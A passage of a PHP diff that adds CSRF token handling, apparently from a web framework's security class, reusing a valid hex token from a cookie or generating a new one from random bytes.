+if (isset($_COOKIE[$this->_csrf_cookie_name]) && is_string($_COOKIE[$this->_csrf_cookie_name])
+&& preg_match('#^[0-9a-f]{32}$#iS', $_COOKIE[$this->_csrf_cookie_name]) === 1)
+{
+return $this->_csrf_hash = $_COOKIE[$this->_csrf_cookie_name];
+}
+$rand = $this->get_random_bytes(16);
+$this->_csrf_hash = ($rand === FALSE)
+? md5(uniqid(mt_rand(), TRUE))
+: bin2hex($rand);
+}
+return $this->_csrf_hash;
+}
+}
